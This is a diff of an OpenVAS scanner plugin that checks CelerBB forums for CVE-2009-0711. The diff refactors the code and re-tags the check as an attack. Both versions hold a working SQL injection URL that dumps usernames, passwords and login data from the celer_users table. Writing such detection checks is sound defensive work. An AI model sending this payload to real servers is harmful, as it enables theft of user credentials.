@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: celerbb_multiple_sql_injection.nasl 4574 2016-11-18 13:36:58Z teissa $
+# $Id: celerbb_multiple_sql_injection.nasl 5776 2017-03-30 06:05:40Z cfi $
 #
 # CelerBB Information Disclosure and Multiple SQL Injection
 # Vulnerabilities
@@ -35,22 +35,19 @@ tag_summary = "CelerBB is prone to an information-disclosure vulnerability and
 
   CelerBB 0.0.2 is vulnerable; other versions may also be affected.";
 
-
-if (description)
+if(description)
 {
  script_id(100017);
- script_version("$Revision: 4574 $");
- script_tag(name:"last_modification", value:"$Date: 2016-11-18 14:36:58 +0100 (Fri, 18 Nov 2016) $");
+ script_version("$Revision: 5776 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-30 08:05:40 +0200 (Thu, 30 Mar 2017) $");
  script_tag(name:"creation_date", value:"2009-03-06 13:13:19 +0100 (Fri, 06 Mar 2009)");
  script_bugtraq_id(34014);
  script_cve_id("CVE-2009-0711");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
-
  script_name("CelerBB Information Disclosure and Multiple SQL Injection Vulnerabilities");
-
- script_category(ACT_GATHER_INFO);
-  script_tag(name:"qod_type", value:"remote_vul");
+ script_category(ACT_ATTACK);
+ script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
@@ -64,24 +61,18 @@ include("http_func.inc");
 include("http_keepalive.inc");
 
 port = get_http_port(default:80);
-
-if(!get_port_state(port))exit(0);
 if(!can_host_php(port:port)) exit(0);
 
-dir = make_list("/celer","/forum","/celerbb", cgi_dirs());
+foreach dir( make_list_unique( "/celer", "/forum", "/celerbb", cgi_dirs( port:port ) ) ) {
 
-foreach d (dir)
-{ 
- url = string(d, "/viewforum.php?id=-1%27%20UNION%20ALL%20SELECT%201,2,GROUP_CONCAT(CONCAT(username,%200x3a,%20password,0x3a,id,0x3a,last_login)),4,5,6,7,8%20FROM%20celer_users%23");
- req = http_get(item:url, port:port);
- buf = http_keepalive_send_recv(port:port, data:req, bodyonly:0);
- if( buf == NULL )continue;
+  if( dir == "/" ) dir = "";
+  url = string(dir, "/viewforum.php?id=-1%27%20UNION%20ALL%20SELECT%201,2,GROUP_CONCAT(CONCAT(username,%200x3a,%20password,0x3a,id,0x3a,last_login)),4,5,6,7,8%20FROM%20celer_users%23");
  
- if ( egrep(pattern:">.*:+.*:+[0-9]+:+[0-9]+</th>", string: buf) )
-   {    
-    security_message(port:port);
-    exit(0);
-   }
+  if(http_vuln_check(port:port, url:url,pattern:">.*:+.*:+[0-9]+:+[0-9]+</th>")) {
+    report = report_vuln_url( port:port, url:url );
+    security_message( port:port, data:report );
+    exit( 0 );
+  }
 }
 
-exit(0);
+exit( 99 );
